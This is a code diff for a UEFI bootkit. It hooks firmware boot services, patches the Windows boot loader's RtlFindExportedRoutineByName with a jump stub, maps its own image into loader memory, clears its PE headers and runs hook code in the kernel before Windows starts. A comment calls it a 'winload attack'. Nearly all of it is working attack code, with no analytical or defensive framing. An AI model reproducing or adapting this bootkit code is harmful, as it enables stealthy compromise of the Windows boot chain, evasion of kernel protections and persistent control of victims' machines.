@@ -27,14 +27,15 @@ extern "C"
 	//
 	// EFI image variables
 	//
-	QWORD EfiBaseVirtualAddress = 0;
 	QWORD EfiBaseAddress        = 0;
 	QWORD EfiBaseSize           = 0;
+	DWORD GlobalStatusVariable  = 0;
 
 	//
 	// EFI global variables
 	//
-	EFI_EXIT_BOOT_SERVICES  oExitBootServices;
+	EFI_ALLOCATE_PAGES oAllocatePages;
+	EFI_EXIT_BOOT_SERVICES oExitBootServices;
 	EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN MapKey);
 
 }
@@ -63,6 +64,61 @@ inline void PressAnyKey()
 	} while ( 1 );
 	gST->ConOut->ClearScreen(gST->ConOut);
 	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
+}
+
+namespace hooks
+{
+	BOOLEAN initialize(void);
+}
+
+unsigned __int64 __fastcall RtlFindExportedRoutineByName(QWORD BaseAddress, const char *ExportName)
+{
+	if (!strcmp_imp(ExportName, "NtImageInfo"))
+	{
+		pe_resolve_imports(BaseAddress, EfiBaseAddress);
+		pe_clear_headers(EfiBaseAddress);
+
+
+		__int64 (__fastcall *BlMmMapPhysicalAddressEx)(__int64 *a1, __int64 a2, unsigned __int64 a3, unsigned int a4, char a5);
+		*(QWORD*)&BlMmMapPhysicalAddressEx = GetExportByName(get_caller_base((QWORD)_ReturnAddress()), "BlMmMapPhysicalAddressEx");
+
+		
+		QWORD EfiBaseVirtualAddress = EfiBaseAddress;	
+		EFI_STATUS status = BlMmMapPhysicalAddressEx((__int64*)&EfiBaseVirtualAddress,
+							EfiBaseVirtualAddress,
+							EfiBaseSize,
+							0x24000,
+							0);
+		
+		if (!EFI_ERROR(status))
+		{
+			SwapMemory2(EfiBaseAddress, EfiBaseVirtualAddress);
+			GlobalStatusVariable = hooks::initialize();
+			SwapMemory2(EfiBaseVirtualAddress, EfiBaseAddress);
+		}
+	}
+	return GetExportByName(BaseAddress, ExportName);
+}
+
+EFI_STATUS EFIAPI AllocatePagesHook(
+	IN     EFI_ALLOCATE_TYPE            Type,
+	IN     EFI_MEMORY_TYPE              MemoryType,
+	IN     UINTN                        Pages,
+	IN OUT EFI_PHYSICAL_ADDRESS         *Memory
+	)
+{
+	QWORD return_address = (QWORD)_ReturnAddress();
+	if (*(DWORD*)(return_address) == 0x48001F0F)
+	{
+		QWORD target_routine = GetExportByName(get_caller_base(return_address), "RtlFindExportedRoutineByName");
+		if (target_routine)
+		{
+			*(QWORD*)(target_routine + 0x00) = 0x25FF;
+			*(QWORD*)(target_routine + 0x06) = (QWORD)RtlFindExportedRoutineByName;
+			gBS->AllocatePages = oAllocatePages;
+		}
+	}
+	return oAllocatePages(Type, MemoryType, Pages, Memory);
 }
 
 extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
@@ -120,67 +176,22 @@ extern "C" EFI_STATUS EFIAPI EfiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TA
 	EfiBaseAddress = (QWORD)rwx;
 	EfiBaseSize    = (QWORD)current_image->ImageSize;
 
+	//
+	// install EFI hooks for winload attack
+	//
+	oAllocatePages = gBS->AllocatePages;
+	gBS->AllocatePages = AllocatePagesHook;
 
-	//
-	// hook ExitBootServices
-	//
 	oExitBootServices = gBS->ExitBootServices;
 	gBS->ExitBootServices = ExitBootServicesHook;
 
 	gST->ConOut->ClearScreen(gST->ConOut);
 	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
 
-
 	Print(FILENAME L" " SERVICE_NAME L" is now started");
 	gST->ConOut->SetCursorPosition(gST->ConOut, 0, 1);
 	PressAnyKey();
 	return EFI_SUCCESS;
-}
-
-
-BOOLEAN EfiConvertPointer(QWORD loader_parameter_block, QWORD physical_address, QWORD *virtual_address)
-{
-	VOID *map = *(VOID**)(loader_parameter_block + 0x110 + 0x28);
-	UINT32 map_size = *(UINT32*)(loader_parameter_block + 0x110 + 0x30);
-	UINT32 descriptor_size = *(UINT32*)(loader_parameter_block + 0x110 + 0x34);
-	UINT32 descriptor_count = map_size / descriptor_size;
-
-	for (UINT32 i = 0; i < descriptor_count; i++)
-	{
-		EFI_MEMORY_DESCRIPTOR *entry = (EFI_MEMORY_DESCRIPTOR*)((char *)map + (i*descriptor_size));
-		if (physical_address >= entry->PhysicalStart && physical_address <= (entry->PhysicalStart + EFI_PAGES_TO_SIZE(entry->NumberOfPages)))
-		{
-			INT64 delta = (INT64)physical_address - (INT64)entry->PhysicalStart;
-			*virtual_address = (entry->VirtualStart + delta);
-			return 1;
-		}
-	}
-	return 0;
-}
-
-inline QWORD get_virtual_address(VOID *ptr)
-{
-	return (QWORD)((QWORD)EfiBaseVirtualAddress + ((QWORD)ptr - (QWORD)EfiBaseAddress));
-}
-
-namespace hooks
-{
-	BOOLEAN initialize(void);
-}
-
-BOOLEAN initialize_kernelmode(QWORD LoaderParameterBlock)
-{
-	QWORD ntoskrnl = GetModuleEntry((LIST_ENTRY*)(LoaderParameterBlock + 0x10), L"ntoskrnl.exe");
-	if (!ntoskrnl)
-	{
-		return 0;
-	}
-	if (!pe_resolve_imports(ntoskrnl, EfiBaseVirtualAddress))
-	{
-		return 0;
-	}
-	pe_clear_headers(EfiBaseVirtualAddress);
-	return ((BOOLEAN(*)(void))(get_virtual_address((VOID*)hooks::initialize)))();
 }
 
 extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN MapKey)
@@ -190,43 +201,7 @@ extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN M
 	gST->ConOut->ClearScreen(gST->ConOut);
 	gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);
 
-
-	QWORD winload_base = get_winload_base((QWORD)_ReturnAddress());
-	if (winload_base == 0)
-	{
-		//
-		// failed to load
-		//
-		return 0;
-	}
-
-	
-	enum WinloadContext
-	{
-		ApplicationContext,
-		FirmwareContext
-	};
-
-	typedef void(__stdcall* BlpArchSwitchContext_t)(int target);
-	BlpArchSwitchContext_t BlpArchSwitchContext;
-	BlpArchSwitchContext = (BlpArchSwitchContext_t)(FindPattern(winload_base, (unsigned char*)"\x40\x53\x48\x83\xEC\x20\x48\x8B\x15", (unsigned char*)"xxxxxxxxx"));
-	if (BlpArchSwitchContext == 0)
-	{
-		return 0;
-	}
-
-	QWORD loader_parameter_block = get_loader_block(winload_base);
-	BlpArchSwitchContext(ApplicationContext);
-
-	BOOLEAN status = 0;
-	if (EfiConvertPointer(loader_parameter_block, EfiBaseAddress, &EfiBaseVirtualAddress))
-	{
-		status = initialize_kernelmode(loader_parameter_block);
-	}
-
-	BlpArchSwitchContext(FirmwareContext);
-
-	if (status)
+	if (GlobalStatusVariable)
 	{
 		Print(FILENAME L" Success -> " SERVICE_NAME L" service is running.");
 	}
@@ -234,9 +209,10 @@ extern "C" EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE ImageHandle,UINTN M
 	{
 		Print(FILENAME L" Failure -> Unsupported OS.");
 	}
-
+	
 	gST->ConOut->SetCursorPosition(gST->ConOut, 0, 1);
 	PressAnyKey();
 
 	return gBS->ExitBootServices(ImageHandle, MapKey);
 }
+
